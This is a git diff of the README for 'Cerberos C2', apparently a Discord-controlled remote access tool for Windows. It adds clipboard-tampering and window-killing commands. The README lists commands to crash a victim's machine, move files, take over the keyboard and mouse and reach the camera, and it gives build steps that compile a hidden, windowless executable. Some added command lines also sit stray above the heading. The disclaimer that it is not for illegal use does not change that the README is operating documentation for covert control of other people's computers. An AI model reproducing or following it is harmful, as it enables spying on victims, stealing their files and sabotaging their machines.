@@ -1,14 +1,21 @@
+!termcmd {ID}		>> start to delete all cmd windows
+!terchrome {ID} 	>> start to delete all chrome windows
+!syslan {ID} 		>> get system language
+!delclipboard {ID}	>> delete active clipboard
+!setclipboard {ID} {T} 	>> replace t with your text. set current clipboard
 # Cerberos-C2
 Cerberos C2 has over 50+ Functions, Cerberos Uses Discord as the C2. Cerberos CAN ONLY BE USED TO CONTROL WINDOWS. \
 Cerberos v1.0.0 is created on 09-8-2022 by Vczz0.\
 Cerberos is Tested on Windows 10+\
-Total Spended Hours: 15~
+Total Spended Hours: 25~
 #### BTC: bc1ql98s5yu2yt0r0rnp4ytc76sadd2xewapszmpd3
 
 
 # WARNING!!
 Cerberos C2 is not created for illegal purpose. The creator is not responsible for any damage. 
 
+# Why?
+i created this program to check my coding and hacking skills, and as a contribution to the hacktoberfest 2022. 
 # Requirements
 1. Windows 10 for setup
 2. Python 3.10.6
@@ -54,7 +61,11 @@ change {ID} to the client ID wich you want to control.
 !bluescreen {ID} 		       >> Bluescreen's client.
 !window {ID} 			       >> Get client window text. 
 !admincheck {ID}                       >> Checks for admin rights.
-
+!termcmd {ID}			       >> start to delete all cmd windows
+!terchrome {ID} 	               >> start to delete all chrome windows
+!syslan {ID} 		               >> get system language
+!delclipboard {ID}	               >> delete active clipboard
+!setclipboard {ID} {TEXT} 	       >> replace {TEXT} with your text. set current clipboard
 # Files
 !upload {ID} {LINK} {NAME} / {PATH}    >> Uploads a file. Trough link. you can upload a file in the #upload channel and copy link from there. Enter file or path to store file.
 !download {ID} {FILE}		       >> Downloads file from client. 
@@ -64,9 +75,9 @@ change {ID} to the client ID wich you want to control.
 # Mouse / Keys    		       
 !key {ID} {KEY} 		       >> Clicks Key given on clients keyboard change {KEY} with the key.
 !morekey {ID} {KEY} 		       >> Clicks multiple Key given on clients keyboard change {KEY} with the key's.
-!mousemove {ID} {coordinates} 	       >> Move's client mouse to given coordinates.
-!mouseclick {ID} {coordinates} 	       >> Clicks on coordinates given.
-!mouysedoubleclick {ID} {coordinates}  >> Double clicks on coordinates given.
+!mousemove {ID} {coordinates} 	           >> Move's client mouse to given coordinates.
+!mouseclick {ID} {coordinates} 	           >> Clicks on coordinates given.
+!mouysedoubleclick {ID} {coordinates}      >> Double clicks on coordinates given.
 
 
 # Cam
@@ -143,3 +154,4 @@ change {ID} to the client ID wich you want to control.
 35. Open The Idle to change "main.py". Scroll till you see: BOT_TOKEN = "[BOT_TOKEN_HERE]". Replace [BOT_TOKEN_HERE] with your Copied Bot token setup earlier
 36. Open the cmd window again. now type: ```pyinstaller main\main.py --onefile --noconsole --i \ico\exe.ixo``` and hit "Enter"
 37. You can find the exe in the dist dir. 
+
